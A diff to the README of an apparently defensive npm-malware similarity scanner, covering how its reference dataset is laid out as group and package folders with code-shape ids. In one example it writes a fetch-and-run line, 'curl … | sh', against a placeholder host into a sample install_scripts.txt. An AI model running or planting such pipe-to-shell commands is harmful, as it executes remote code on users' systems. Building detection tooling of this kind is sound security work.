@@ -45,8 +45,32 @@ the two keys above. `-k` ranks groups by their lowest NCD.
 
 ## Malware reference folder (`<reference_dir>`)
 
-The shipped v1 and v2 sets both use `<group>/<package>@<version>/<file>`, where the group is
-a 12-hex-digit code-shape id and nested package paths are flattened with `__`:
+Both shipped sets use `<group>/<package>@<version>/<file>`. **`<group>` is the placeholder for
+the first folder below the reference directory.** It is a free-form label: not a path to a real
+npm scope, not validated by the scanner, and not fixed by any format. Its only jobs are to name
+the `group` field in reports, to be the unit ranked by `-k`, and to let packages of one family or
+code shape share a folder.
+
+In the shipped sets the group is a **12-hex-digit code-shape id**:
+
+| Set | Group folders | Packages | Group id | Packages per group |
+|---|---|---|---|---|
+| v1 (`data/v1`) | 4,778 | 5,904 | 12 hex digits, e.g. `2bc69730cdf0` | up to 3 |
+| v2 (`data/v2`) | 6,500 | 6,500 | 12 hex digits, a different shape rule | 1 |
+
+The id is produced by the dataset builder, not by the scanner. `build_dataset.py` blanks strings,
+numbers, comments and `_0x…` obfuscator names out of each file, removes whitespace, hashes every
+file shape, sorts the hashes, hashes that list and keeps the first 12 hex characters. v1 used a
+coarser shape rule, so the same package can get a different id in v1 and in v2. The encrypted zips
+are split by the first character of the id: `malware_js_0.zip` holds every group starting with
+`0`, `malware_js_f.zip` every group starting with `f`.
+
+Your own reference set can use any label, for example `refs/my-campaign/evil-pkg@1.0.0/`. Keep the
+code-shape convention only if you want the shipped selectors and the `-k` ranking to behave the
+same way. Because a group folder may hold several package folders, packages of one campaign can
+be grouped together and reported as one entry by `-k`.
+
+Nested package paths are flattened with `__`:
 
 ```
 malware_refs/                          <- <reference_dir>
@@ -67,8 +91,9 @@ malware_refs/                          <- <reference_dir>
 
 Requirements and conventions:
 
-- **Group folder.** Any label works; it is the `group` in reports and the unit ranked by
-  `-k`. One folder per code shape in v1/v2.
+- **Group folder.** The first folder below the reference directory. Any label works; it is the
+  `group` in reports and the unit ranked by `-k`. The shipped sets use one folder per code shape
+  (4,778 in v1, 6,500 in v2), and a group folder may hold more than one package folder.
 - **Package folder.** One folder per name and version, named `<name>@<version>` so the
   report can split it into package name and version. Put different versions in separate
   sibling folders; never nest them.
@@ -91,8 +116,10 @@ for z in data/v1/malware_js_*.zip; do
 done
 
 # sanity checks
-find ~/packguard-data/v1/malware_js -mindepth 2 -maxdepth 2 -type d | wc -l   # 5,904
+find ~/packguard-data/v1/malware_js -mindepth 2 -maxdepth 2 -type d | wc -l   # 5,904 packages
+find ~/packguard-data/v1/malware_js -mindepth 1 -maxdepth 1 -type d | wc -l   # 4,778 groups
 find ~/packguard-data/v1/malware_js -type f -name '*.js' | wc -l              # 39,119
+ls ~/packguard-data/v1/malware_js | head                                      # group ids
 ```
 
 Extract **all 16 zips into the same parent directory**; the zips split the set by the first
@@ -102,18 +129,28 @@ an individual package folder.
 
 For v2 use `data/v2/malware_js_*.zip` and a separate directory such as
 `~/packguard-data/v2/malware_js`. Do not mix v1 and v2: v2 packages may carry
-`install_scripts.txt`, and its shapes were built with a different rule.
+`install_scripts.txt`, and its shapes were built with a different rule. Its sanity checks are
+6,500 package folders and 6,500 group folders:
+
+```bash
+find ~/packguard-data/v2/malware_js -mindepth 2 -maxdepth 2 -type d | wc -l   # 6,500 packages
+find ~/packguard-data/v2/malware_js -mindepth 1 -maxdepth 1 -type d | wc -l   # 6,500 groups
+```
 
 ### Create a minimal custom reference set
 
 ```bash
-mkdir -p refs/group-a/evil-pkg@1.0.0
-cp samples/evil-pkg/index.js refs/group-a/evil-pkg@1.0.0/index.js
+mkdir -p refs/my-campaign/evil-pkg@1.0.0
+cp samples/evil-pkg/index.js refs/my-campaign/evil-pkg@1.0.0/index.js
 printf '%s\n' 'curl -s https://example.invalid/x | sh' \
-    > refs/group-a/evil-pkg@1.0.0/install_scripts.txt
+    > refs/my-campaign/evil-pkg@1.0.0/install_scripts.txt
 
 build/packguard -j 4 refs scan/foo@1.0.0
 ```
+
+Here `my-campaign` is the group and `evil-pkg@1.0.0` is the package. Any group label is accepted,
+which is why `<group>` in the layout and in the report keys is a placeholder rather than a fixed
+folder name; the shipped sets fill it with the code-shape id.
 
 The first positional argument is the reference directory; every later path is a package to
 scan.
@@ -243,7 +280,8 @@ docker run --rm --network none \
 
 1. Count package folders, for example
    `find <reference_dir> -mindepth 2 -maxdepth 2 -type d | wc -l` (malware) or
-   `find <benign_dir> -mindepth 1 -maxdepth 1 -type d | wc -l` (benign).
+   `find <benign_dir> -mindepth 1 -maxdepth 1 -type d | wc -l` (benign), and count the group
+   folders with `find <reference_dir> -mindepth 1 -maxdepth 1 -type d | wc -l`.
 2. Make sure no `package.json` is in a reference set; install scripts belong in
    `install_scripts.txt`.
 3. Make sure the benign set is flat: `find <benign_dir> -mindepth 2 -type d` must be empty
